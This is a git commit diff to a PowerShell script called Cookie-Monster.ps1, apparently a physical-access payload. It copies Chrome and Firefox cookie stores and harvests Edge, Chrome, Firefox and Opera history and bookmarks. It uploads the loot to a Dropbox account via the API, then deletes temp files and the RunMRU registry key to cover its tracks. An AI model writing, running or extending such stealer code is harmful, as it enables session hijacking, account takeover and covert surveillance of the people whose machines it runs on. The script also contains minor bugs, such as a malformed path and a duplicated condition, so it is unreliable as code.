6787c251f3fe26e2220de8658bcd797b661360b6
0D1NSS0N <115773776+0d1nss0n@users.noreply.github.com>
2023-05-12 08:56:30 -0700

    Update Cookie-Monster.ps1

--- Cookie-Monster.ps1
+++ Cookie-Monster.ps1
@@ -2,11 +2,11 @@ $GcookiesPath = "C:\Users\$env:UserName\AppData\Local\Google\Chrome\User Data\De
 $GfilePath = "$env:temp\Cookies"
 $GdestinationPath = "/Loot/$env:USERNAME/Cookies"
 
-------------------------------------------------------------------------------------------------------------------------------------------
+#------------------------------------------------------------------------------------------------------------------------------------
 
 Copy-Item -Path $GcookiesPath -Destination $GfilePath -Force
 
-------------------------------------------------------------------------------------------------------------------------------------------
+#------------------------------------------------------------------------------------------------------------------------------------
 #
 # This section will search for firefox cookies and place them in a folder in the tmp directory then zip the file to be sent to dropbox
 #
@@ -46,8 +46,65 @@ if ($Results) {
 
 Compress-Archive -Path "$env:tmp\Firefox-Cookies" -DestinationPath "$env:tmp\Firefox-Cookies.zip"
 
+#---------------------------------------------------------------------------------------------------------------------------------------
 
-------------------------------------------------------------------------------------------------------------------------------------------
+$BfilePath = "$env:tmp\--BrowserData.txt"
+$BdestinationPath = "/Loot/$env:USERNAME/--BrowserData.txt"
+
+function Get-BrowserData {
+
+    [CmdletBinding()]
+    param (	
+    [Parameter (Position=1,Mandatory = $True)]
+    [string]$Browser,    
+    [Parameter (Position=1,Mandatory = $True)]
+    [string]$DataType 
+    ) 
+
+    $Regex = '(http|https)://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?'
+
+    if     ($Browser -eq 'chrome'  -and $DataType -eq 'history'   )  {$Path = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\History"}
+    elseif ($Browser -eq 'chrome'  -and $DataType -eq 'bookmarks' )  {$Path = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Bookmarks"}
+    elseif ($Browser -eq 'edge'    -and $DataType -eq 'history'   )  {$Path = "$Env:USERPROFILE\AppData\Local\Microsoft/Edge/User Data/Default/History"}
+    elseif ($Browser -eq 'edge'    -and $DataType -eq 'bookmarks' )  {$Path = "$env:USERPROFILE/AppData/Local/Microsoft/Edge/User Data/Default/Bookmarks"}
+    elseif ($Browser -eq 'firefox' -and $DataType -eq 'history'   )  {$Path = "$Env:USERPROFILE\AppData\Roaming\Mozilla\Firefox\Profiles\*.default-release\places.sqlite"}
+    elseif ($Browser -eq 'opera'   -and $DataType -eq 'history'   )  {$Path = "$Env:USERPROFILE\AppData\Roaming\Opera Software\Opera GX Stable\History"}
+    elseif ($Browser -eq 'opera'   -and $DataType -eq 'history'   )  {$Path = "$Env:USERPROFILE\AppData\Roaming\Opera Software\Opera GX Stable\Bookmarks"}
+
+    $Value = Get-Content -Path $Path | Select-String -AllMatches $regex |% {($_.Matches).Value} |Sort -Unique
+    $Value | ForEach-Object {
+        $Key = $_
+        if ($Key -match $Search){
+            New-Object -TypeName PSObject -Property @{
+                User = $env:UserName
+                Browser = $Browser
+                DataType = $DataType
+                Data = $_
+            }
+        }
+    } 
+}
+
+Get-BrowserData -Browser "edge" -DataType "history" >> $env:TMP\--BrowserData.txt
+
+Get-BrowserData -Browser "edge" -DataType "bookmarks" >> $env:TMP\--BrowserData.txt
+
+Get-BrowserData -Browser "chrome" -DataType "history" >> $env:TMP\--BrowserData.txt
+
+Get-BrowserData -Browser "chrome" -DataType "bookmarks" >> $env:TMP--BrowserData.txt
+
+Get-BrowserData -Browser "firefox" -DataType "history" >> $env:TMP\--BrowserData.txt
+
+Get-BrowserData -Browser "opera" -DataType "history" >> $env:TMP\--BrowserData.txt
+
+Get-BrowserData -Browser "opera" -DataType "bookmarks" >> $env:TMP\--BrowserData.txt
+
+
+#------------------------------------------------------------------------------------------------------------------------------------
+
+#Upload to Dropbox
+
+# Chrome Data
 
 try {
     $headers = @{
@@ -67,6 +124,8 @@ catch {
     Write-Host "Error occurred while uploading the file: $_" -ForegroundColor Red
 }
 
+# Firefox Data
+
 try {
     $headers = @{
         "Authorization" = "Bearer $db"
@@ -84,6 +143,29 @@ try {
 catch {
     Write-Host "Error occurred while uploading the file: $_" -ForegroundColor Red
 }
+
+# Browser History/Bookmarks
+
+try {
+    $headers = @{
+        "Authorization" = "Bearer $db"
+        "Content-Type" = "application/octet-stream"
+        "Dropbox-API-Arg" = '{"path": "' + $BdestinationPath + '", "mode": "add", "autorename": true, "mute": false}'
+    }
+
+    $fileContent = [System.IO.File]::ReadAllBytes($filePath)
+    $url = "https://content.dropboxapi.com/2/files/upload"
+
+    Invoke-RestMethod -Uri $url -Method Post -Headers $headers -InFile $BfilePath -ContentType "application/octet-stream"
+
+    Write-Host "Firefox Cookie Jar uploaded successfully"
+}
+catch {
+    Write-Host "Error occurred while uploading the file: $_" -ForegroundColor Red
+}
+
+#------------------------------------------------------------------------------------------------------------------------------------
+
 
 rm $env:tmp\* -r -Force -ErrorAction SilentlyContinue
 reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f 
